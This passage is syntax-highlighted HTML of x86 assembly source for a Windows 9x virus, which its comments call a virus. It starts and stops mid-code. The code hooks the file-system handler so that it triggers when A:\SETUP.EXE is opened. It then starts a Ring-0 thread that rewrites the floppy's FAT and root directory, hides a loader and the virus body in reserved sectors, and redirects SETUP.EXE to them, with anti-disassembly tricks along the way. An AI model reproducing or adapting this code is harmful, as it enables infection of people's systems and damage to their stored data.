    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">        </span><span class="sc1">;open?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">quitHandler</span><span class="sc0">             </span><span class="sc1">;no, quit</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gdlta</span><span class="sc0">              </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;prefix - anti-disassembler</span><span class="sc0">
</span><span class="sc5">gdlta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;and anti-lamer</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;ECX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;ECX=0 or 1</span><span class="sc0">
</span><span class="sc5">semaphore</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">exitHandler</span><span class="sc0">           </span><span class="sc1">;semaphore set? then quit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">semaphore</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc1">;set semaphore</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get disk no.</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;is it A: ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exitHandler</span><span class="sc0">             </span><span class="sc1">;no, quit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">             </span><span class="sc1">;add A letter</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">             </span><span class="sc1">;add : letter</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;store it</span><span class="sc0">

</span><span class="sc5">wegotdrive</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">            </span><span class="sc1">;convert UNICOE filename to ANSI</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc0">               </span><span class="sc1">;correct shitty stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;and terminate filename with \0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">              </span><span class="sc1">;calculate CRC32 of filename</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4662AD0h</span><span class="sc0">         </span><span class="sc1">;is it "A:\SETUP.EXE,0" ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">setup_exe</span><span class="sc0">                </span><span class="sc1">;yeah, continue</span><span class="sc0">

</span><span class="sc5">exitHandler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">semaphore</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">;set semaphore</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">;restore all registers</span><span class="sc0">
</span><span class="sc5">quitHandler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">OldIFSHandler</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;jump to next handler</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">18h</span><span class="sc0">               </span><span class="sc1">;correct stack</span><span class="sc0">
    </span><span class="sc6">leave</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">

</span><span class="sc5">setup_exe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">              </span><span class="sc1">;thread stack</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Thread_Infect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;address of thread proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;next crappy parameter</span><span class="sc0">
    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">_VWIN32_CreateRing0Thread</span><span class="sc0">   </span><span class="sc1">;create new Ring-0 thread</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitHandler</span><span class="sc0">             </span><span class="sc1">;and quit</span><span class="sc0">
                        </span><span class="sc1">; - anti-everything</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">                </span><span class="sc1">;prefix - anti-disassembler</span><span class="sc0">
</span><span class="sc5">Thread_Infect</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;Ring-0 thread proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ti_next</span><span class="sc0">             </span><span class="sc1">;jump over</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;leave code be overwritten</span><span class="sc0">
</span><span class="sc5">ti_next</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">tigdelta</span><span class="sc0">               </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">ti_gdelta</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">            </span><span class="sc1">;next prefix</span><span class="sc0">
</span><span class="sc5">tigdelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BOOT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;read BOOT sector</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int25h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_thread</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BOOT</span><span class="sc4">+</span><span class="sc2">0bh</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01010200h</span><span class="sc0"> </span><span class="sc1">;check, if diskette is </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_thread</span><span class="sc0">                 </span><span class="sc1">;1,44MB, check FAT and</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BOOT</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc1">;ROOT possition</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_thread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BOOT</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_thread</span><span class="sc0">             </span><span class="sc1">;no, its not 1,44MB FD</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FAT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int25h</span><span class="sc0">             </span><span class="sc1">;read FAT</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">        </span><span class="sc1">;check if it is 1,44MB</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_thread</span><span class="sc0">             </span><span class="sc1">;no, quit</span><span class="sc0">


    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FAT</span><span class="sc4">+</span><span class="sc2">4223</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;check FAT, if last sectors r</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;free</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">sFAT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_thread</span><span class="sc0">             </span><span class="sc1">;no, quit</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">sFAT</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;now we will mark FAT, last</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;sectors will be marked as</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ff0ff00h</span><span class="sc0">          </span><span class="sc1">;RESERVED</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">73</span><span class="sc0">                 </span><span class="sc1">;coz we infect 12bit FAT, we</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;use this loop to mark it so</span><span class="sc0">
</span><span class="sc5">markFAT</span><span class="sc4">:</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">markFAT</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">markFAT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">         </span><span class="sc1">;mark end</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ROOTinit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int25h</span><span class="sc0">             </span><span class="sc1">;read ROOT</span><span class="sc0">

</span><span class="sc5">f_cmp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;get ptr to ROOT          </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                              
    </span><span class="sc6">lodsd</span><span class="sc0">                                 
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;ZERO?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                               
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">exit_thread</span><span class="sc0">              </span><span class="sc1">;yeah, no more filez, quit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">              </span><span class="sc1">;calculate CRC32 of file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">873F6A26h</span><span class="sc0">          </span><span class="sc1">;is it SETUP.EXE?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fn_ok</span><span class="sc0">                                </span><span class="sc1">;yeah, continue</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc0">               </span><span class="sc1">;no, process next directory rec.</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">f_cmp</span><span class="sc0">               </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">fn_ok</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;save cluster_ptr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">save</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;save filesize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">save</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2800</span><span class="sc0">        </span><span class="sc1">;new cluster_ptr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">        </span><span class="sc1">;new filesize</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">loader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2880</span><span class="sc4">-</span><span class="sc2">49</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int26h</span><span class="sc0">             </span><span class="sc1">;write DOS loader</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">42</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">membase</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2880</span><span class="sc4">-</span><span class="sc2">48</span><span class="sc0">            </span><span class="sc1">;write virus</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int26h</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">save</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2880</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int26h</span><span class="sc0">             </span><span class="sc1">;write SAVE area</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ROOTinit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int26h</span><span class="sc0">             </span><span class="sc1">;write ROOT</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FAT</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ti_gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int26h</span><span class="sc0">             </span><span class="sc1">;write first FAT</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Int26h</span><span class="sc0">             </span><span class="sc1">;write second FAT</span><span class="sc0">

</span><span class="sc5">exit_thread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and exit</span><span class="sc0">


</span><span class="sc5">ROOTinit</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;procedure to initialize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">                 </span><span class="sc1">;registers for reading/writing</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ROOT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
